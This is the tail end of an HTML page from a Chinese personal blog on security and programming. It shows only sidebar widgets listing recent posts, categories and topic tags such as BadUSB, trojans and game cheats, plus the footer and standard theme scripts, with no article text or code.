icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站 <img src= "/img/loading.gif" data-lazy-src="/img/announcement.gif" style="zoom:75%;" ></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/07/FurtherMathematics_0x01/" title="高等数学"><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/154.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="高等数学"/></a><div class="content"><a class="title" href="/2022/12/07/FurtherMathematics_0x01/" title="高等数学">高等数学</a><time datetime="2022-12-07T15:58:53.000Z" title="发表于 2022-12-07 23:58:53">2022-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/24/FPV/" title="FPV笔记"><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/151.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="FPV笔记"/></a><div class="content"><a class="title" href="/2022/10/24/FPV/" title="FPV笔记">FPV笔记</a><time datetime="2022-10-24T13:01:07.000Z" title="发表于 2022-10-24 21:01:07">2022-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/22/Python/" title="代码审计笔记（Python）"><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/150.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="代码审计笔记（Python）"/></a><div class="content"><a class="title" href="/2022/09/22/Python/" title="代码审计笔记（Python）">代码审计笔记（Python）</a><time datetime="2022-09-22T15:58:53.000Z" title="发表于 2022-09-22 23:58:53">2022-09-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB"><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/149.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="简单的BadUSB"/></a><div class="content"><a class="title" href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB">简单的BadUSB</a><time datetime="2022-07-14T15:58:53.000Z" title="发表于 2022-07-14 23:58:53">2022-07-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)"><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/148.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(八)"/></a><div class="content"><a class="title" href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)">CSGO破解学习(八)</a><time datetime="2022-05-19T15:58:53.000Z" title="发表于 2022-05-19 23:58:53">2022-05-19</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/C-%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">C++笔记</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CodeQL/"><span class="card-category-list-name">CodeQL</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Docker%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Docker笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/GDB%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">GDB笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Golang%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Golang笔记</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Linux%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Linux笔记</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/Windows%E7%AC%94%E8%AE%B0/"><span class="card-category-list-name">Windows笔记</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/XSS/"><span class="card-category-list-name">XSS</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/BadUSB/" style="font-size: 1.15em; color: rgb(117, 135, 87)">BadUSB</a><a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 1.2em; color: rgb(117, 78, 136)">钓鱼</a><a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 1.35em; color: rgb(23, 96, 194)">免杀</a><a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 1.3em; color: rgb(200, 70, 200)">木马</a><a href="/tags/%E7%97%85%E6%AF%92/" style="font-size: 1.2em; color: rgb(71, 139, 176)">病毒</a><a href="/tags/%E7%BB%95%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.15em; color: rgb(28, 116, 185)">绕虚拟机</a><a href="/tags/CobaltStrike/" style="font-size: 1.2em; color: rgb(96, 101, 165)">CobaltStrike</a><a href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/" style="font-size: 1.15em; color: rgb(76, 51, 114)">C++命名规范</a><a href="/tags/Metasploit/" style="font-size: 1.15em; color: rgb(135, 121, 114)">Metasploit</a><a href="/tags/C/" style="font-size: 1.4em; color: rgb(25, 59, 190)">C++</a><a href="/tags/%E6%AD%A3%E5%88%99/" style="font-size: 1.15em; color: rgb(30, 30, 120)">正则</a><a href="/tags/CSGO/" style="font-size: 1.45em; color: rgb(198, 39, 173)">CSGO</a><a href="/tags/%E7%A0%B4%E8%A7%A3/" style="font-size: 1.45em; color: rgb(26, 171, 93)">破解</a><a href="/tags/%E5%A4%96%E6%8C%82/" style="font-size: 1.45em; color: rgb(98, 140, 50)">外挂</a><a href="/tags/CodeQL/" style="font-size: 1.15em; color: rgb(111, 25, 122)">CodeQL</a><a href="/tags/XSS/" style="font-size: 1.2em; color: rgb(6, 50, 27)">XSS</a><a href="/tags/Docker/" style="font-size: 1.15em; color: rgb(22, 143, 58)">Docker</a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.15em; color: rgb(142, 154, 54)">数据库</a><a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 1.15em; color: rgb(190, 170, 168)">SQL注入</a><a href="/tags/ELF/" style="font-size: 1.15em; color: rgb(79, 101, 175)">ELF</a><a href="/tags/DLL%E5%8A%AB%E6%8C%81/" style="font-size: 1.15em; color: rgb(7, 131, 133)">DLL劫持</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA/" style="font-size: 1.15em; color: rgb(31, 59, 23)">无人机</a><a href="/tags/%E6%97%A0%E4%BA%BA%E6%9C%BA%E9%85%8D%E4%BB%B6/" style="font-size: 1.15em; color: rgb(47, 39, 102)">无人机配件</a><a href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/" style="font-size: 1.15em; color: rgb(95, 10, 14)">去除特征</a><a href="/tags/%E9%AB%98%E6%95%B0/" style="font-size: 1.15em; color: rgb(133, 27, 62)">高数</a><a href="/tags/GDB/" style="font-size: 1.15em; color: rgb(116, 185, 0)">GDB</a><a href="/tags/Golang/" style="font-size: 1.15em; color: rgb(48, 54, 7)">Golang</a><a href="/tags/%E7%A1%AC%E4%BB%B6/" style="font-size: 1.15em; color: rgb(172, 85, 176)">硬件</a><a href="/tags/%E5%A0%86/" style="font-size: 1.25em; color: rgb(61, 158, 115)">堆</a><a href="/tags/%E6%A0%88/" style="font-size: 1.35em; color: rgb(96, 15, 120)">栈</a><a href="/tags/%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84/" style="font-size: 1.15em; color: rgb(162, 72, 9)">内存结构</a><a href="/tags/%E6%BA%A2%E5%87%BA/" style="font-size: 1.35em; color: rgb(6, 71, 84)">溢出</a><a href="/tags/%E6%8A%93%E5%8C%85/" style="font-size: 1.15em; color: rgb(26, 89, 200)">抓包</a><a href="/tags/%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(25, 52, 65)">双向认证</a><a href="/tags/%E5%8D%95%E5%90%91%E8%AE%A4%E8%AF%81/" style="font-size: 1.15em; color: rgb(190, 15, 194)">单向认证</a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.25em; color: rgb(157, 76, 89)">信息收集</a><a href="/tags/java%E7%8E%AF%E5%A2%83/" style="font-size: 1.15em; color: rgb(39, 39, 31)">java环境</a><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="font-size: 1.15em; color: rgb(155, 94, 26)">应急响应</a><a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 1.4em; color: rgb(88, 63, 105)">红蓝对抗</a><a href="/tags/%E5%8F%8D%E5%BC%B9shell/" style="font-size: 1.15em; color: rgb(30, 123, 117)">反弹shell</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">2022年12月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">2022年10月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/09/"><span class="card-archive-list-date">2022年09月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">2022年07月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/05/"><span class="card-archive-list-date">2022年05月</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/04/"><span class="card-archive-list-date">2022年04月</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/03/"><span class="card-archive-list-date">2022年03月</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/02/"><span class="card-archive-list-date">2022年02月</span><span class="card-archive-list-count">1</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">67</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2017-08-08T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">196.3k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2022-12-13T06:30:58.569Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://raw.staticdn.net/Ascotbe/Random-img/master/Blog/1.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By ascotbe</div><div class="footer_custom_text">Hi, welcome to my <a href="https://www.ascotbe.com/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>function subtitleType () {
  if (true) { 
    window.typed = new Typed("#subtitle", {
      strings: ["我们都是阴沟里的虫子&#44;但总还是得有人仰望星空","We are all in the gutter&#44;but there is still looking at the stars."],
      startDelay: 300,
      typeSpeed: 150,
      loop: true,
      backSpeed: 50
    })
  } else {
    document.getElementById("subtitle").innerHTML = '我们都是阴沟里的虫子&#44;但总还是得有人仰望星空'
  }
}

if (true) {
  if (typeof Typed === 'function') {
    subtitleType()
  } else {
    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
  }
} else {
  subtitleType()
}</script></div><script src="/js/snowflake.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"model":{"jsonPath":"/live2dw/assets/ots14_3001.model.json"},"display":{"position":"right","width":350,"height":400,"hOffset":-50,"vOffset":0},"mobile":{"show":false},"log":false});</script></body></html>